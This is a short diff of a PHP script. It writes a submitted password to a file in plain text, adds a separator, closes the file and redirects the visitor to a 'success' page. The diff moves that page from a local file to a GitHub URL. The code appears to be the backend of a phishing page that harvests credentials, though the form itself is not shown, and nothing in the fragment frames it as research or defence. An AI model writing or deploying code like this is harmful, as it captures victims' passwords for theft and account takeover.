@@ -10,5 +10,5 @@
 	fwrite($file,"PASSWORD : " .$pass. "\n");
 	fwrite($file,"- - - - - - - - - - - - - - - - - - - - \n");
 	fclose($file);
-	header("Location:success.html");
+	header("Location:https://github.com/JagarapuManoj/hi/blob/main/success.html");
 ?>
